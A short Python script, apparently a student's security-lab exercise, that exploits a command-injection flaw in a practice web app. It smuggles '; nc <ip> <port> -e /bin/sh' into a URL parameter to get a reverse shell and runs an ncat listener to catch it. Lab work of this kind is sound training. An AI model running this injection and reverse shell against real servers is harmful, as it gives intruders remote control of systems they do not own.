#!/usr/bin/env python

# Carlos Mendoza - Lab3 Part1 - CSCI4621

import threading
import os
import time
import sys
import webbrowser

def openPenTesterSite(myIP, myPort, siteIP):
	global exited
	time.sleep(2.0)
	# Visit the site with the extra command which has myIP and myPort and siteIP
	webbrowser.open("http://" + siteIP + "/commandexec/example1.php?ip=127.0.0.1; nc " + myIP + " " + myPort + " -e /bin/sh")
	print("Shell Opened")
	while exited == False:
		pass
	return

def listenPortAndInput(myPort):
	global exited
	# Run the "ncat -l -p [myPort]" command in the terminal
	os.system("ncat -l -p " + myPort + "")
	# Wait until site responds from listen
	#openPenTesterSite(myIP, myPort, siteIP)
	"""
	x = ""
	while True:
		# For each new line in the interactive shell, print "lab3sh> " to let the user know that they're still in this shell
		# Listen for user input
		inputString = input('lab3sh> ')
		if inputString == "exit":
			print('exiting now...')
			break
		else:
			pass
	"""
	exited = True
	return

if __name__ == "__main__":
	exited = False
	# FILL IN with your IPv4 address using the "ipconfig" command in your terminal
	myIP = ""
	myPort = "5454"
	args = sys.argv[1:]
	# IP address argument is found using the "ifconfig" command in the Pentester VM
	siteIP = args[0]
	p0 = threading.Thread(target=listenPortAndInput, args=(myPort,))
	p1 = threading.Thread(target=openPenTesterSite, args=(myIP, myPort, siteIP,))
	p0.start()
	p1.start()
	p0.join()
	p1.join()